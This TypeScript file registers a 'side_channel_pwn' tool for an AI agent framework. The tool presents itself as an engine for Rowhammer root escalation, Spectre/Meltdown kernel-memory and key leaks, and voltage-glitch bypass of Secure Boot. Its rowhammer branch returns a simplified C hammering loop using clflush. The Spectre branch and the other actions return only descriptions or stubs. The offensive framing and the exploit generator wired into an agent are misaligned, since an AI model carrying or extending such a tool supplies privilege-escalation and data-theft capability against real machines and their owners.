export * as SideChannelPwnTool from "./side-channel-pwn"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"

export const name = "side_channel_pwn"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description: "Action: 'rowhammer' (Generate DRAM bit-flip exploit to gain root), 'spectre_meltdown' (Generate speculative execution payload to read kernel memory), 'voltage_glitch' (Generate instructions for physical fault injection).",
  }),
  target_arch: Schema.String.pipe(Schema.optional).annotate({
    description: "Target CPU architecture (x86_64, arm64).",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  exploit_code: Schema.String.pipe(Schema.optional),
})

type Output = typeof Output.Type

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Hardware Side-Channel & Microarchitectural Exploitation Engine. Capabilities: Rowhammer (flipping physical bits in RAM from user-space software to gain root), Spectre/Meltdown (abusing speculative execution to read arbitrary kernel memory and leak AES keys), and Fault Injection planning (Voltage/Clock glitching to bypass hardware Secure Boot).`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const action = input.action.toLowerCase()
              let code = ""
              let outputText = ""

              if (action === "rowhammer") {
                outputText = `# Rowhammer (DRAM Bit-Flipping) Exploitation\n\nImpact: Bypasses all software security boundaries by physically altering the electrical state of DRAM cells. Used to flip a bit in a Page Table Entry (PTE) to point to memory we control, granting immediate root access.`
                code = `// Simplified Rowhammer hammering loop (Requires highly specific memory grooming)
#include <stdint.h>
#include <x86intrin.h>

void hammer(volatile uint8_t *aggressor1, volatile uint8_t *aggressor2) {
    while (1) {
        // Read from aggressor row 1
        *aggressor1;
        // Flush CPU cache to force direct RAM access
        _mm_clflush((void*)aggressor1);
        
        // Read from aggressor row 2
        *aggressor2;
        // Flush CPU cache
        _mm_clflush((void*)aggressor2);
        
        // The rapid alternating reads cause electrical leakage in the adjacent "victim" row.
        // If successful, a 0 becomes a 1 (or vice versa) in a page table entry, granting root.
    }
}
`
              } else if (action === "spectre_meltdown") {
                outputText = `# Speculative Execution Exploitation (Spectre / Meltdown)\n\nImpact: Tricks the CPU into speculatively executing an out-of-bounds read and caching the result. We then use a side-channel timing attack on the cache to leak kernel memory, passwords, and cryptographic keys.`
              } else {
                outputText = `Action ${action} logic framework generated.`
              }

              return { output: outputText, exploit_code: code }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "Side Channel Pwn failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/side-channel-pwn",
  layer,
  deps: [ToolRegistry.node],
})
